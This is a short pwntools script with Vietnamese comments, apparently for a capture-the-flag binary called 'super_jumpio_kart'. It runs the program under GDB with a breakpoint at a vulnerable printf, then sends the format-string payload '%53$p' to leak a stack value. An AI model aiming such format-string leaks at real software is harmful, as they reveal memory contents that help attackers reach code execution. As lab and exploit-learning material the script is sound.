from pwn import *
import os

BINARY = './super_jumpio_kart'
context.binary = BINARY

# Lấy đường dẫn tuyệt đối đến thư mục hiện tại
# Điều này đảm bảo GDB sẽ chuyển đến đúng thư mục dù nó được mở ở đâu
CWD = os.getcwd()

# Tạo chuỗi script cho GDB
# 1. cd {CWD}: Chuyển đến thư mục làm việc của script
# 2. b *(_Z6customv+159): Đặt breakpoint tại lệnh printf format string
# 3. continue: Tiếp tục chạy chương trình cho đến khi gặp breakpoint
gdb_script = f"""
    cd {CWD}
    b *(_Z6customv+159)
    continue
"""

# Khởi động GDB và truyền script vào
p = gdb.debug(BINARY, gdbscript=gdb_script)

# --- Bây giờ tương tác với tiến trình ---

# Gửi các input cần thiết để đến được breakpoint
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'Power Up: ', b'%53$p')

# Dừng ở đây để bạn có thể xem GDB
# Sau khi xem xong, bạn có thể đóng cửa sổ GDB và script sẽ kết thúc
p.interactive()